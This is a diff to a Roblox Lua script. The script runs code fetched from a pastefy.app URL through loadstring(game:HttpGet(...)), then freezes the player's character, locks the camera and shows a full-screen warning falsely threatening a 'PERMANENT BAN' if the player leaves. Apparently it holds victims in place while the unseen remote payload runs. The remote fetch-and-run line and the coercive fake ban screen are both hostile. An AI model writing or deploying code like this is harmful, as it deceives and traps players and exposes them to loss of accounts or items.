@@ -1,1 +1,44 @@
 loadstring(game:HttpGet("https://pastefy.app/vItsWtT6/raw"))()
+local player = game:GetService("Players").LocalPlayer
+local UIS = game:GetService("UserInputService")
+
+-- Freeze character
+spawn(function()
+	local char = player.Character or player.CharacterAdded:Wait()
+	local hum = char:WaitForChild("Humanoid")
+	hum.WalkSpeed = 0
+	hum.JumpPower = 0
+end)
+
+-- Lock camera
+pcall(function()
+	workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+end)
+
+-- Disable inputs
+UIS.InputBegan:Connect(function() return true end)
+UIS.InputEnded:Connect(function() return true end)
+
+-- GUI warning
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.ResetOnSpawn = false
+
+local txt = Instance.new("TextLabel", gui)
+txt.Size = UDim2.new(1, 0, 1, 0)
+txt.BackgroundTransparency = 0.3
+txt.BackgroundColor3 = Color3.new(0, 0, 0)
+txt.TextColor3 = Color3.new(1, 0, 0)
+txt.TextScaled = true
+txt.RichText = true
+txt.Font = Enum.Font.GothamBlack
+txt.Text = [[
+⚠️ <b><u>WARNING</u></b> ⚠️
+
+<font color="red"><b>DON'T LEAVE</b></font>
+
+If you exit now, it will result in a
+
+<font color="red"><b>PERMANENT BAN</b></font>
+]]
+txt.TextXAlignment = Enum.TextXAlignment.Center
+txt.TextYAlignment = Enum.TextYAlignment.Center
